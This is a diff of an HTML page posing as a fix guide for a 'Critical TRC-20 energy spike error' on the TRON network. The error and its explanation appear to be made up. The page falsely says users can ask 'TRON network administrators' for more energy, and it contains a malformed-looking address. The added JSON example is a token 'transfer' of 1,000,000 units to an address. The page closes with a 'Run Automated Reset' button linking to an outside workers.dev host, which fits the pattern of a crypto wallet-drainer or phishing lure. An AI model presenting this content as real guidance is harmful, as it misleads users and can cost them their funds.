@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Critical Trc 20 Energy Spike Error</title>
 <style>
     body {
-        font-family: -apple-system;
-        background: #1a1a24;
+        font-family: sans-serif;
+        background: #0f111a;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -25,7 +25,7 @@
     }
     a { color: #ff9455; }
     .btn {
-        background: #ff7b2c;
+        background: #00adb5;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -41,31 +41,43 @@
 <div class="content">
 <h2>Symptom</h2>
 <ul>
-<li>Users encounter a "Critical TRC-20 energy spike error" when attempting to initiate transactions or interact with smart contracts on the TRON network, resulting in failed transactions and potential loss of assets.</li>
+<li>The user encounters a "Critical TRC-20 energy spike error" when attempting to interact with TRC-20 tokens on the TRON network, resulting in failed transactions and potential loss of assets.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to an unexpected surge in energy consumption by TRC-20 tokens, exceeding the allocated energy limits set by the TRON network, leading to a critical system failure.</li>
+<li>This error occurs due to an unexpected surge in energy consumption by smart contracts, exceeding the allocated energy limits for the user's account, thereby preventing further transactions.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Increase the energy limit for the specific TRC-20 token contract to accommodate the increased demand.</li>
-<li>Implement a rate-limiting mechanism to prevent excessive energy consumption by the contract.</li>
-<li>Update the contract's code to optimize energy efficiency, as shown in the following example:</li>
+<li>Increase the account's energy limit by submitting a request to the TRON network administrators.</li>
+<li>Optimize smart contract code to reduce energy consumption, using techniques such as caching and batch processing.</li>
+<li>Adjust the transaction parameters, such as setting a lower <code>energyLimit</code> and <code>energyPrice</code> in the transaction payload, as shown in the following example:</li>
 </ul>
 <div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;contract&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;TRC20Token&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;energyLimit&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">10000</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;rateLimit&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">10</span>
+<span class="w">  </span><span class="nt">&quot;contract&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;TFmtFpu4QXFHzxVC8vLsHTf7fJ1zW1Z8Cu&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;function&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;transfer&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;parameters&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
+<span class="w">    </span><span class="p">{</span>
+<span class="w">      </span><span class="nt">&quot;type&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;address&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;value&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;TGse6Y8xL8T4iZzW1Z8Cu&quot;</span>
+<span class="w">    </span><span class="p">},</span>
+<span class="w">    </span><span class="p">{</span>
+<span class="w">      </span><span class="nt">&quot;type&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;uint256&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;value&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;1000000&quot;</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">  </span><span class="p">],</span>
+<span class="w">  </span><span class="nt">&quot;feeLimit&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">100000000</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;energyLimit&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">100000</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;energyPrice&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span>
 <span class="p">}</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console for further debugging and customization. </p>
+<p>Consider utilizing an external console for more complex troubleshooting and debugging tasks. </p>
 <h2>Prerequisites</h2>
 <ul>
-<li>A basic understanding of TRON's energy system and TRC-20 token contracts.</li>
-<li>Access to the TRON network and relevant contract deployment tools.</li>
-<li>Familiarity with contract code optimization techniques.</li>
+<li>A basic understanding of TRON network architecture and smart contract functionality.</li>
+<li>Familiarity with transaction payload structure and parameter configuration.</li>
+<li>Access to the TRON network and a compatible wallet or client software.</li>
 </ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=gKMyej%40%40" class="btn">🛠 Run Automated Reset</a>
